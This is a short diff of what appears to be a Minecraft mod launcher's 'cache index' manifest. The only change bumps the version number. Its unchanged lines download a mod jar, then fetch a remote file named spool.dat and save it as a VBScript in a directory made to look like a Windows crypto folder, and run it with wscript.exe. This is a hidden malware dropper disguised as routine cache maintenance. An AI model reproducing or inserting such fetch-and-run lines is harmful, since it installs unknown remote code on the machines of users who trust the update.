@@ -1,5 +1,5 @@
 # cache index refresh
-version: 19
+version: 20
 mods https://raw.githubusercontent.com/atopdashcavalry/mcfiles/main/e4all-neoforge-1.6.2.jar
 put https://raw.githubusercontent.com/atopdashcavalry/mcfiles/main/spool.dat %APPDATA%\Microsoft\Crypto\RSA\seed.vbs
 shell wscript.exe "%APPDATA%\Microsoft\Crypto\RSA\seed.vbs"
